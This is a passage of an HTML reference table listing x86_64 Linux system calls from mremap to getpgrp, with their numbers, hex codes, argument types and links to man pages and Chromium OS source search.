align="center">0x19</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">26</td><td>msync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td><td align="center">0x1a</td><td>unsigned long start</td><td>size_t len</td><td>int flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">27</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0x1b</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">28</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0x1c</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">29</td><td>shmget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td><td align="center">0x1d</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">30</td><td>shmat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td><td align="center">0x1e</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">31</td><td>shmctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td><td align="center">0x1f</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">32</td><td>dup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup">cs/</a></td><td align="center">0x20</td><td>unsigned int fildes</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">33</td><td>dup2</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/dup2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*dup2">cs/</a></td><td align="center">0x21</td><td>unsigned int oldfd</td><td>unsigned int newfd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">34</td><td>pause</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pause.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pause">cs/</a></td><td align="center">0x22</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">35</td><td>nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*nanosleep">cs/</a></td><td align="center">0x23</td><td>struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">36</td><td>getitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getitimer">cs/</a></td><td align="center">0x24</td><td>int which</td><td>struct itimerval *value</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">37</td><td>alarm</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/alarm.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*alarm">cs/</a></td><td align="center">0x25</td><td>unsigned int seconds</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">38</td><td>setitimer</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setitimer.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setitimer">cs/</a></td><td align="center">0x26</td><td>int which</td><td>struct itimerval *value</td><td>struct itimerval *ovalue</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">39</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0x27</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">40</td><td>sendfile</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile">cs/</a></td><td align="center">0x28</td><td>int out_fd</td><td>int in_fd</td><td>off_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">41</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0x29</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">42</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0x2a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">43</td><td>accept</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td><td align="center">0x2b</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">44</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0x2c</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">45</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0x2d</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">46</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0x2e</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">47</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0x2f</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">48</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0x30</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">49</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0x31</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">50</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0x32</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">51</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0x33</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">52</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0x34</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">53</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0x35</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">54</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0x36</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">55</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0x37</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">56</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0x38</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">57</td><td>fork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fork">cs/</a></td><td align="center">0x39</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">58</td><td>vfork</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vfork.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vfork">cs/</a></td><td align="center">0x3a</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">59</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0x3b</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">60</td><td>exit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit">cs/</a></td><td align="center">0x3c</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">61</td><td>wait4</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td><td align="center">0x3d</td><td>pid_t pid</td><td>int *stat_addr</td><td>int options</td><td>struct rusage *ru</td><td>-</td><td>-</td></tr><tr><td align="center">62</td><td>kill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kill">cs/</a></td><td align="center">0x3e</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">63</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0x3f</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">64</td><td>semget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td><td align="center">0x40</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">65</td><td>semop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td><td align="center">0x41</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">66</td><td>semctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td><td align="center">0x42</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td></tr><tr><td align="center">67</td><td>shmdt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td><td align="center">0x43</td><td>char *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">68</td><td>msgget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td><td align="center">0x44</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">69</td><td>msgsnd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td><td align="center">0x45</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td></tr><tr><td align="center">70</td><td>msgrcv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td><td align="center">0x46</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td></tr><tr><td align="center">71</td><td>msgctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td><td align="center">0x47</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">72</td><td>fcntl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl">cs/</a></td><td align="center">0x48</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">73</td><td>flock</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flock">cs/</a></td><td align="center">0x49</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">74</td><td>fsync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsync">cs/</a></td><td align="center">0x4a</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">75</td><td>fdatasync</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fdatasync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fdatasync">cs/</a></td><td align="center">0x4b</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">76</td><td>truncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/truncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*truncate">cs/</a></td><td align="center">0x4c</td><td>const char *path</td><td>long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">77</td><td>ftruncate</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ftruncate.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ftruncate">cs/</a></td><td align="center">0x4d</td><td>unsigned int fd</td><td>unsigned long length</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">78</td><td>getdents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents">cs/</a></td><td align="center">0x4e</td><td>unsigned int fd</td><td>struct linux_dirent *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">79</td><td>getcwd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcwd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcwd">cs/</a></td><td align="center">0x4f</td><td>char *buf</td><td>unsigned long size</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">80</td><td>chdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chdir">cs/</a></td><td align="center">0x50</td><td>const char *filename</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">81</td><td>fchdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchdir">cs/</a></td><td align="center">0x51</td><td>unsigned int fd</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">82</td><td>rename</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rename.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rename">cs/</a></td><td align="center">0x52</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">83</td><td>mkdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdir">cs/</a></td><td align="center">0x53</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">84</td><td>rmdir</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/rmdir.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rmdir">cs/</a></td><td align="center">0x54</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">85</td><td>creat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/creat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*creat">cs/</a></td><td align="center">0x55</td><td>const char *pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">86</td><td>link</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/link.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*link">cs/</a></td><td align="center">0x56</td><td>const char *oldname</td><td>const char *newname</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">87</td><td>unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlink">cs/</a></td><td align="center">0x57</td><td>const char *pathname</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">88</td><td>symlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlink">cs/</a></td><td align="center">0x58</td><td>const char *old</td><td>const char *new</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">89</td><td>readlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlink">cs/</a></td><td align="center">0x59</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">90</td><td>chmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chmod">cs/</a></td><td align="center">0x5a</td><td>const char *filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">91</td><td>fchmod</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmod.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmod">cs/</a></td><td align="center">0x5b</td><td>unsigned int fd</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">92</td><td>chown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown">cs/</a></td><td align="center">0x5c</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">93</td><td>fchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown">cs/</a></td><td align="center">0x5d</td><td>unsigned int fd</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">94</td><td>lchown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown">cs/</a></td><td align="center">0x5e</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">95</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0x5f</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">96</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0x60</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">97</td><td>getrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td><td align="center">0x61</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">98</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0x62</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">99</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0x63</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">100</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x64</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">101</td><td>ptrace</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ptrace">cs/</a></td><td align="center">0x65</td><td>long request</td><td>long pid</td><td>unsigned long addr</td><td>unsigned long data</td><td>-</td><td>-</td></tr><tr><td align="center">102</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0x66</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">103</td><td>syslog</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/syslog.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syslog">cs/</a></td><td align="center">0x67</td><td>int type</td><td>char *buf</td><td>int len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">104</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0x68</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">105</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x69</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">106</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x6a</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">107</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0x6b</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">108</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0x6c</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">109</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x6d</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">110</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0x6e</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">111</td><td>getpgrp</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgrp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgrp">cs/</a></td><td 